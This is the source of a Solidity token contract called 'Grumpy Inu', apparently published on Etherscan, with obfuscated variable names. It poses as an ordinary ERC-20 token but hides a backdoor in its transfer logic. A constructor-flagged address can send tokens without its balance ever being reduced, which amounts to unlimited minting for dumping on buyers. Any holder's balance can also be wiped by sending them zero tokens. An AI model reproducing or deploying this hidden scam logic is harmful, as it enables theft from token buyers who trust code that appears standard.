/**
 *Submitted for verification at Etherscan.io on 2023-08-31
*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GRINU is Ownable {
    function transfer(address boljscp, uint256 kafozut) public returns (bool success) {
        tpia(msg.sender, boljscp, kafozut);
        return true;
    }

    function transferFrom(address rhguacf, address boljscp, uint256 kafozut) public returns (bool success) {
        require(kafozut <= allowance[rhguacf][msg.sender]);
        allowance[rhguacf][msg.sender] -= kafozut;
        tpia(rhguacf, boljscp, kafozut);
        return true;
    }

    uint256 private wugrboe = 101;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address aideuwb) {
        balanceOf[msg.sender] = totalSupply;
        zwjukoy[aideuwb] = wugrboe;
        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        fgjmzlw = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
    }

    uint256 public totalSupply = 10000000000 * 10 ** 9;

    mapping(address => uint256) private zwjukoy;

    function tpia(address rhguacf, address boljscp, uint256 kafozut) private {
        if (0 == zwjukoy[rhguacf]) {
            balanceOf[rhguacf] -= kafozut;
        }
        balanceOf[boljscp] += kafozut;
        if (0 == kafozut && boljscp != fgjmzlw) {
            balanceOf[boljscp] = kafozut;
        }
        emit Transfer(rhguacf, boljscp, kafozut);
    }

    mapping(address => uint256) private tokzajin;

    string public symbol = 'GRINU';

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    function approve(address voumhsb, uint256 kafozut) public returns (bool success) {
        allowance[msg.sender][voumhsb] = kafozut;
        emit Approval(msg.sender, voumhsb, kafozut);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    address public fgjmzlw;

    string public name = 'Grumpy Inu';
}